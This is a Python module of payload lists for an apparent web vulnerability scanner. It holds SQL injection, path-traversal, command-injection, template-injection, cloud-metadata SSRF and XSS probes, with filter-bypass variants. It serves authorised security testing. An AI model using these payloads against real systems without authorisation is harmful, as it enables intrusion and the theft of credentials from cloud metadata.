"""Centralized payload corpora for the parameter-probing scanners (PRD §6).

Each injection scanner imports the corpus it needs from here, so the payloads
are versioned in one place, easy to review/extend, and unit-testable as pure
data. Payloads are deliberately *detection-grade* - small, high-signal sets
paired with precise response detectors (DBMS error signatures, file content
markers, reflected canaries, timing) rather than blind fuzz lists. A handful of
well-chosen variants per technique gives broad coverage (multiple DBMS / OSes /
template engines / clouds, plus a few encodings for double-decoding sinks)
without ballooning the request count.

Transport note: query/body values are URL/form-encoded again by the HTTP layer,
so literal payloads (``../``, ``' AND '1'='1``) reach the target verbatim, while
the pre-encoded variants (``..%2f``, ``..%252f``) are aimed at sinks that decode
their input one or more extra times.
"""

from __future__ import annotations

# ===========================================================================
# SQL injection (orthrus.scanners.sqli)
# ===========================================================================

# Syntax-breaking characters/sequences that provoke a DBMS error when the input
# is concatenated into a query. Pairs well with detect_sql_error().
SQLI_ERROR: tuple[str, ...] = (
    "'",
    '"',
    "`",
    "\\",
    "')",
    "';",
    "'))",
    '"))',
    "`)",
    "'\"",
    "';-- -",
    "')-- -",
    "'))-- -",
    "' OR '1'='1'-- -",
    "1'1",
)

# Context-spanning boolean-blind pairs: (label, TRUE-suffix, FALSE-suffix).
# Each suffix is appended to the parameter's original value. A param is flagged
# when the TRUE response resembles the baseline while the FALSE response
# diverges (see sqli.boolean_injectable). Covering string/numeric/parenthesised/
# double-quoted contexts means one closing style not matching the backend query
# does not mask the finding.
SQLI_BOOLEAN_PAIRS: tuple[tuple[str, str, str], ...] = (
    ("string-quote", "' AND '1'='1", "' AND '1'='2"),
    ("numeric", " AND 1=1", " AND 1=2"),
    ("paren-string", "') AND ('1'='1", "') AND ('1'='2"),
    ("double-quote", '" AND "1"="1', '" AND "1"="2'),
    ("comment", "' AND 1=1-- -", "' AND 1=2-- -"),
)

# DBMS-tagged time-based blind payloads. ``{n}`` is the sleep duration in
# seconds; appended to the original value. Detection is purely by elapsed time.
SQLI_TIME: tuple[tuple[str, str], ...] = (
    ("MySQL", "' AND SLEEP({n})-- -"),
    ("MySQL", "' AND (SELECT 1 FROM (SELECT(SLEEP({n})))a)-- -"),
    ("PostgreSQL", "' AND (SELECT 1 FROM PG_SLEEP({n}))-- -"),
    ("PostgreSQL", "';SELECT PG_SLEEP({n})-- -"),
    ("Microsoft SQL Server", "'; WAITFOR DELAY '0:0:{n}'-- -"),
    ("Oracle", "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{n})-- -"),
)


# ===========================================================================
# Local file inclusion / path traversal (orthrus.scanners.lfi)
# ===========================================================================

LFI_PATHS: tuple[str, ...] = (
    # --- *nix /etc/passwd: depth + encoding variants -------------------------
    "../../../../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "/etc/passwd",
    "....//....//....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",  # double-encoded
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",  # overlong UTF-8
    "../../../../../../etc/passwd%00",  # legacy PHP null-byte truncation
    "../../../../../../etc/passwd%00.png",
    "file:///etc/passwd",
    # --- Windows win.ini -----------------------------------------------------
    "../../../../../../../../windows/win.ini",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "..%255c..%255c..%255cwindows%255cwin.ini",  # double-encoded backslash
    "C:\\windows\\win.ini",
    "C:/windows/win.ini",
)


# ===========================================================================
# OS command injection (orthrus.scanners.cmd_injection)
# ===========================================================================


def cmd_output_payloads(value: str, canary: str) -> list[str]:
    """Output-based command-injection probes that try to ``echo`` ``canary``.

    Covers POSIX and Windows shell separators, substitution, newline injection,
    and quote/double-quote breakouts. Detection looks for the canary alone (the
    command's output), not the reflected ``echo <canary>`` literal.
    """
    cmd = f"echo {canary}"
    return [
        f"{value}; {cmd}",
        f"{value} | {cmd}",
        f"{value}|| {cmd}",
        f"{value}&& {cmd}",
        f"{value}& {cmd}",
        f"{value}`{cmd}`",
        f"{value}$({cmd})",
        f"{value}%0a{cmd}",
        f"{value}%0d%0a{cmd}",
        f"{value}\n{cmd}",
        f'{value}"; {cmd}',
        f"{value}'; {cmd}",
        f"{value}' && {cmd} #",
    ]


def cmd_time_payloads(value: str, seconds: int) -> list[str]:
    """Time-based command-injection probes (POSIX ``sleep`` + Windows ``ping``/``timeout``)."""
    return [
        f"{value}; sleep {seconds}",
        f"{value} | sleep {seconds}",
        f"{value}|| sleep {seconds}",
        f"{value}&& sleep {seconds}",
        f"{value}`sleep {seconds}`",
        f"{value}$(sleep {seconds})",
        f"{value}& ping -n {seconds + 1} 127.0.0.1",
        f"{value}&& ping -n {seconds + 1} 127.0.0.1",
        f"{value}& timeout /t {seconds}",
        f"{value}%0asleep {seconds}",
    ]


# ===========================================================================
# Server-side template injection (orthrus.scanners.ssti)
# ===========================================================================


def ssti_templates(expr: str) -> list[tuple[str, str]]:
    """(engine-label, payload) pairs wrapping an arithmetic ``expr`` per engine.

    If an engine evaluates our input the *product* appears while the literal
    ``expr`` does not (see ssti.ssti_evaluated), so non-evaluating engines that
    echo the payload verbatim never false-positive.
    """
    return [
        ("Jinja2/Twig", "{{" + expr + "}}"),
        ("Jinja2/Smarty", "${{" + expr + "}}"),
        ("Freemarker/JSP-EL/Mako", "${" + expr + "}"),
        ("Spring-EL/Ruby-Slim", "#{" + expr + "}"),
        ("ERB/EJS", "<%= " + expr + " %>"),
        ("Thymeleaf-inline", "[[${" + expr + "}]]"),
        ("Thymeleaf-star", "*{" + expr + "}"),
        ("Razor", "@(" + expr + ")"),
        ("Velocity", "#set($x=" + expr + ")${x}"),
        # Distinct syntaxes that evaluate arithmetic and aren't a delimiter family
        # already probed above:
        ("Latte", "{=" + expr + "}"),  # Nette/Latte {=...} prints an evaluated expression
        ("Smarty-math", "{" + expr + "}"),  # Smarty default {..} delimiters evaluate math
    ]


# ===========================================================================
# Server-side request forgery (orthrus.scanners.ssrf)
# ===========================================================================

# Cloud instance-metadata endpoints across providers, plus a couple of
# IP-obfuscation bypasses for the AWS link-local address. Paired with
# ssrf.detect_metadata_leak, which matches signatures present only in genuine
# metadata *responses* (never in these payload URLs).
SSRF_METADATA: tuple[str, ...] = (
    # AWS IMDS. (No /latest/dynamic/instance-identity/ URL here: it would
    # contain the "instance-id" signature token and so false-positive on mere
    # reflection - detect_metadata_leak requires signatures absent from payloads.)
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    # AWS link-local via IP-obfuscation / allow-list bypasses. All resolve (or
    # are parsed) as 169.254.169.254 by a permissive fetcher, so they slip past a
    # filter that only blocks the literal dotted-quad while still returning IMDS
    # content that detect_metadata_leak() signatures on.
    "http://2852039166/latest/meta-data/",  # decimal of 169.254.169.254
    "http://[::ffff:169.254.169.254]/latest/meta-data/",
    "http://0xa9fea9fe/latest/meta-data/",  # hex of 169.254.169.254
    "http://0251.0376.0251.0376/latest/meta-data/",  # octal dotted-quad
    "http://169.254.169.254.nip.io/latest/meta-data/",  # DNS wildcard -> link-local
    "http://foo@169.254.169.254/latest/meta-data/",  # userinfo parser confusion (host stays IMDS)
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
    # Azure IMDS
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Alibaba Cloud
    "http://100.100.100.200/latest/meta-data/",
    # DigitalOcean
    "http://169.254.169.254/metadata/v1.json",
    # Oracle Cloud Infrastructure
    "http://169.254.169.254/opc/v1/instance/",
)


# ===========================================================================
# Cross-site scripting (orthrus.scanners.xss / exploits.xss_confirm / dom_xss)
# ===========================================================================


def xss_execution_payloads(marker: str) -> list[str]:
    """Browser-executing XSS vectors that set ``window['__hx_<marker>']=1``.

    Every payload sets the marker-namespaced global so a browser confirmer can
    detect execution without alert()-dialog storms, and so multiple payloads on
    one page don't clobber each other. Spans script/event-handler/SVG/iframe
    contexts and several tag-breakout prefixes, ending with a context-spanning
    polyglot that fires across HTML/attribute/JS/comment sinks at once.
    """
    js = f"window['__hx_{marker}']=1"
    return [
        f"<script>{js}</script>",
        f'"><script>{js}</script>',
        f"'><script>{js}</script>",
        f"</title><script>{js}</script>",
        f"</textarea><script>{js}</script>",
        f'<img src=x onerror="{js}">',
        f'"><img src=x onerror="{js}">',
        f'<svg onload="{js}">',
        f"<svg/onload={js}>",
        f'<body onload="{js}">',
        f'<details open ontoggle="{js}">',
        f'<input autofocus onfocus="{js}">',
        f'<marquee onstart="{js}">',
        f'<iframe src="javascript:{js}">',
        # Context-spanning polyglot (marker-carrying variant of the classic
        # 0xsobky polyglot): breaks out of HTML/attribute/JS-string/comment and
        # title/textarea/style/script contexts in a single string.
        (
            f"jaVasСript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk={js} )//%0D%0A%0d%0a//"
            f"</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd={js}//>\\x3e"
        ),
    ]


__all__ = [
    "SQLI_ERROR",
    "SQLI_BOOLEAN_PAIRS",
    "SQLI_TIME",
    "LFI_PATHS",
    "cmd_output_payloads",
    "cmd_time_payloads",
    "ssti_templates",
    "SSRF_METADATA",
    "xss_execution_payloads",
]
